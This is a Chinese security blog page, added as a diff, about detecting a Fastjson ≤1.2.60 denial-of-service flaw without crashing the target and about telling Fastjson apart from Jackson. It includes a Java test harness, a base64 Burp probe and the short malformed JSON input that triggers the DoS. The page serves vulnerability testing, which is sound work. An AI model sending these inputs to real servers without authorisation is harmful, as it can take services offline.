@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Fastjson &lt;&#x3D;1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分一、漏洞简介二、漏洞影响Fastjson 1.2.60 以下版本 三、复现过程针对Fastjson DoS 漏洞的检测，相对较好识别，但其需要发送 DoS的请求包，就会有一个时间延迟，但是部分使用者或 SRC平台对 DoS类漏洞持保守态度。 所以这里提出一种无损检测 Fastjson DoS 漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%20_=1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Fastjson &lt;&#x3D;1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分一、漏洞简介二、漏洞影响Fastjson 1.2.60 以下版本 三、复现过程针对Fastjson DoS 漏洞的检测，相对较好识别，但其需要发送 DoS的请求包，就会有一个时间延迟，但是部分使用者或 SRC平台对 DoS类漏洞持保守态度。 所以这里提出一种无损检测 Fastjson DoS 漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId34.png">
+<meta property="article:published_time" content="2022-07-08T06:25:56.503Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Fastjson/Fastjson _=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Fastjson/Fastjson%20_=1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.503Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Fastjson-lt-1-2-60-DoS漏洞无损检测-Fastjson与Jackson组建区分"><a href="#Fastjson-lt-1-2-60-DoS漏洞无损检测-Fastjson与Jackson组建区分" class="headerlink" title="Fastjson &lt;=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分"></a>Fastjson &lt;=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fastjson 1.2.60 以下版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>针对Fastjson DoS 漏洞的检测，相对较好识别，但其需要发送 DoS<br>的请求包，就会有一个时间延迟，但是部分使用者或 SRC平台对 DoS<br>类漏洞持保守态度。</p>
+<p>所以这里提出一种无损检测 Fastjson DoS 漏洞的方法。</p>
+<p>首先有以下几种情况：</p>
+<h3 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a>未知目标是否使用 Fastjson ，但站点有原始报错回显</h3><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p>
+<p>例如</p>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId25.png"></p>
+<h3 id="无回显，盲区分-Fastjson-和-Jackson"><a href="#无回显，盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，盲区分 Fastjson 和 Jackson"></a>无回显，盲区分 Fastjson 和 Jackson</h3><p>Java 系 Json 处理基本只有 Fastjson 和 Jackson。由于 Jackson 相对比较严格, 这里可以很好分辨出 Fastjson 和 Jackson</p>
+<p>如果请求包中的 json 如下:</p>
+<p>{&quot;name&quot;:&quot;S&quot;, &quot;age&quot;:21}</p>
+<p>追加一个随机 key ,修改 json 为</p>
+<p>{&quot;name&quot;:&quot;S&quot;, &quot;age&quot;:21,&quot;agsbdkjada__ss_d&quot;:123}</p>
+<p>这里 Fastjson 是不会报错的, Jackson 因为强制 key 与 javabean<br>属性对齐,只能少不能多 key,所以会报错,服务器的响应包中多少会有异常回显</p>
+<p>Fastjson：</p>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId27.png"></p>
+<p>Jackson：</p>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId28.png"></p>
+<h3 id="无损检测原理"><a href="#无损检测原理" class="headerlink" title="无损检测原理"></a>无损检测原理</h3><p>已经知道目标使用的是 Fastjson ,可以用以下 poc 去检测是否存在 DOS 漏洞</p>
+<p>Fastjson &lt; 1.2.60 在取不到值的时候会填充 \u001a ,在1.2.60 进行了修复, 对 \x 后面的字符进行是否为16进制允许字符<br>(0-9a-fA-F) 的校验,所以这里就可以手动 padding ,构造一个特殊的字符串</p>
+<p>\x\u001a\u001a</p>
+<p>测试代码:</p>
+<p>Main.java</p>
+<pre><code>import com.alibaba.fastjson.JSON;
+
+public class Main &#123;
+    public static void main(String[] args) &#123;
+        String payload = &quot;&#123;\&quot;a\&quot;:\&quot;\\x\u001a\u001a\&quot;&#125;&quot;;
+        System.out.println(payload);
+        Object o = JSON.parseObject(payload);
+        System.out.println(o.getClass());
+    &#125;
+&#125;
+</code></pre>
+<p>Fastjson &lt; 1.2.60</p>
+<p>pom.xml</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;tophant&lt;/groupId&gt;
+    &lt;artifactId&gt;tcc&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+        &lt;version&gt;1.2.59&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+
+&lt;/project&gt;
+</code></pre>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId30.png"></p>
+<p>Fastjson == 1.2.60，可以看到报错</p>
+<p>pom.xml</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;tophant&lt;/groupId&gt;
+    &lt;artifactId&gt;tcc&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+        &lt;version&gt;1.2.60&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+
+&lt;/project&gt;
+</code></pre>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId31.png"></p>
+<h3 id="使用-Burp-测试"><a href="#使用-Burp-测试" class="headerlink" title="使用 Burp 测试"></a>使用 Burp 测试</h3><p>在 Burp 中测试可以使用 : eyJhIjoiXHgaGiJ9 (base64解码)</p>
+<p>当后端 Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错</p>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId33.png"></p>
+<p>使用 {&quot;a:&quot;\x 进行请求就会发生 DOS</p>
+<p><img src="/resource/Fastjson%3C=1.2.60DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/media/rId34.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8Bfastjson-dos%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E7%9B%B2%E5%8C%BA%E5%88%86fastjson%E4%B8%8Ejackson%E7%BB%84%E4%BB%B6/">https://blog.riskivy.com/%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8Bfastjson-dos%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E7%9B%B2%E5%8C%BA%E5%88%86fastjson%E4%B8%8Ejackson%E7%BB%84%E4%BB%B6/</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%20_=1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" data-id="cl5c2qp4i0078y8v18qll1vmv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Fastjson/Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Fastjson/Fastjson%20_=1.2.47%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
